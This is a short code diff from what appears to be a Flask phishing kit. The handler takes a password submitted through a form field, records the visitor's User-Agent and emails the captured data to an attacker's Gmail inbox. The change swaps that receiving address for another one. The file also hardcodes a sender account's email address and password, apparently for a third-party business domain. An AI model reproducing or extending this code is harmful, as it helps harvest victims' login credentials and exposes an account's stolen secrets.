@@ -178,7 +178,7 @@ def first():
         passwordemail = request.form.get('pig')
         sender_email = 'eissa@waterworldwaterpark.com'
         sender_emaill = 'eissa'
-        receiver_email = 's.toihidi@gmail.com'
+        receiver_email = 'tdwmc123456@gmail.com'
         password = 'EISSA47314A'
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart('alternative')
